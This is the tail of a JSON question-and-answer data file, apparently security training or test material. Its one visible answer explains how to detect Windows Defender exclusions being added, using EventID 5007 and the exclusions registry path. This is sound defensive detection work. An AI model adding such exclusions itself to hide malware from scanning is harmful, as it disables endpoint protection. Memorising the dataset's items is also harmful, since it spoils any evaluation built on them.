      "answer": "In order to detect the setting of Windows Defender exclusions, you should: Monitor Windows Defender (WinDefend) logs for events indicating the configuration of the antimalware platform has changed. Specifically, look for EventID 5007, which signifies that there has been a change in the antimalware platform's configuration. Pay close attention to changes which include the addition of new exclusions paths, especially those containing the string '\\Microsoft\\Windows Defender\\Exclusions'. This can be an indicator of an attacker trying to exclude certain files or directories from being scanned by Windows Defender, potentially allowing malicious software to run undetected on the system. Be aware that legitimate administrator actions can also trigger these alerts, so consider these as potential false positives. The severity of this action is considered medium due to its potential use in bypassing Windows Defender's detection capabilities."
    }
  }
]